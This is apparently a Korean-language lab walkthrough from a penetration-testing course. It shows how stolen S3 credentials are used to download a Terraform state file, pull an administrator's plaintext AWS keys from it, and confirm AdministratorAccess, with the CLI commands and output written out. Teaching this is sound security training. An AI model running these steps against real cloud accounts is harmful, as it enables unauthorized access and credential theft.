# 26.10.6 상태 파일 발견과 관리자 권한 상승

> **Discovering the State File and Escalating to Admin** · PEN-200 §26.10.6

목표는 Terraform 상태 파일 읽기임. 읽기 권한은 필수이고, 파일명을 알아야 하므로 나열 권한도 있으면 좋음(없어도 이름을 알면 읽기는 가능). 먼저 `tf-state` 버킷을 나열함.

```
kali@kali:~$ aws --profile=stolen-s3 s3 ls tf-state-9b58rezp3vvkf90f
2023-07-06 12:19:16       6731 terraform.tfstate
```

나열 권한이 있음. 다음은 읽기 — `cp` 로 현재 디렉터리에 복사함. 버킷 이름 앞의 `s3://` 는 로컬 폴더가 아니라 S3 에서 복사한다는 지시임.

```
kali@kali:~$ aws --profile=stolen-s3 s3 cp s3://tf-state-
9b58rezp3vvkf90f/terraform.tfstate ./
download: s3://tf-state-9b58rezp3vvkf90f/terraform.tfstate to ./terraform.tfstate
```

*상태 파일 내려받기 — 버킷 이름이 두 줄로 나뉘어 보이는 것은 교재 지면 폭 때문임*

받은 파일을 구간별로 읽음. 앞부분은 사용자 목록과 각자에게 붙은 정책임.

```
kali@kali:~$ cat -n terraform.tfstate
001  {
...
007      "user_list": {
008        "value": [
009          {
010            "email": "Goran.Bregovic@offseclab.io",
011            "name": "Goran.B",
012            "phone": "+1 555-123-4567",
013            "policy": "arn:aws:iam::aws:policy/AdministratorAccess"
014          },
015          {
016            "email": "Zeljko.Bebek@offseclab.io",
017            "name": "Zeljko.B",
018            "phone": "+1 555-123-4568",
019            "policy": "arn:aws:iam::aws:policy/ReadOnlyAccess"

023            "name": "Alen.I",

```

세 명 중 둘은 `ReadOnlyAccess` 이고 **`Goran.B` 만 `AdministratorAccess`** 임. 이 사용자의 ID 와 키가 같은 파일 안에 있기를 기대하고 계속 읽음.

```

051            "schema_version": 0,
052            "attributes": {

...
063            },
...
069          },
070          {
071            "index_key": "Goran.B",
072            "schema_version": 0,
073            "attributes": {
...
077              "id": "[REDACTED-AWS-KEY-ID]",
...
080              "secret": "[REDACTED-AWS-SECRET]",
...
084            },
...
090          },

```

아래쪽 `resources` 에는 생성된 사용자별 속성이 있고 여기에 `id` 와 `secret` 이 그대로 들어 있음. 상태 파일이 시크릿을 평문으로 보관한다는 것이 이 공격의 전제임.

Goran.B 의 키로 별도 프로필을 만듦.

```
kali@kali:~$ aws configure --profile=goran.b
AWS Access Key ID [None]: [REDACTED-AWS-KEY-ID]
AWS Secret Access Key [None]: [REDACTED-AWS-SECRET]
Default region name [None]: us-east-1
Default output format [None]:
```

*`goran.b` 프로필 등록 — 기존 `stolen-s3` 를 덮지 않도록 이름을 나눔*

정말 관리자인지 `iam list-attached-user-policies` 로 확인함.

```
kali@kali:~$ aws --profile=goran.b iam list-attached-user-policies --user-name goran.b
{
    "AttachedPolicies": [
        {
            "PolicyName": "AdministratorAccess",
            "PolicyArn": "arn:aws:iam::aws:policy/AdministratorAccess"
        }
    ]
}
```

`AdministratorAccess` 가 붙어 있음 — 이 환경의 클라우드 계정에서 관리자 권한 상승에 성공함.
